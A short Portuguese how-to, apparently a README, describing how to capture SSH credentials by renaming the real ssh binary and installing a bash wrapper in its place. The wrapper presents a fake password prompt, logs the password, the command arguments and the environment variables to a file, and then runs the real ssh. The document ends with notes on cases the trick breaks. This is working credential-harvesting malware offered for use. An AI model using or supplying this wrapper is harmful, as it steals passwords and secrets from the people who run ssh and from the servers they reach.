Uma forma simples de obter credenciais para acessar servidores via ssh sem utilizar binários modificados

1 - Binário original do ssh deverá ser renomeado, como pode exemplo de `/usr/bin/ssh`para `/usr/bin/ssh7`
2 - Deverá ser criado um script em bash chamado ssh que irá salvar as variáveis de ambiente e criar um input fake pedindo a senha e depois chamar o binário do ssh

Script bash
```bash
#!/bin/bash

OUTFILE=/home/mksx/env-dump/ssh/`date +"%d-%m-%Y-%H-%M-%S.txt"`

if echo $@ | grep -q ' -i '; then
        env > $OUTFILE
        echo "ssh $@" >> $OUTFILE
        unset $OUTFILE
        ssh7 $@
        exit
fi

while true; do
        echo -n "Password: "
        read -sr SSH_PASS
        if [ -z "$SSH_PASS" ]; then
                echo ''
                continue
        else
                break
        fi
done

env > $OUTFILE

echo "ssh $@ ($SSH_PASS)" >> $OUTFILE

unset $OUTFILE
unset $SSH_PASS

ssh7 $@
ssh7 $@
```

### Observação
 1 - Alteração poderá quebrar o uso do sshpass
 2 - Alteração poderá quebrar scripts que utilização expect
 3 - Caso a senha digitada esteja incorreta, a senha correta que será digitada novamente não será salva
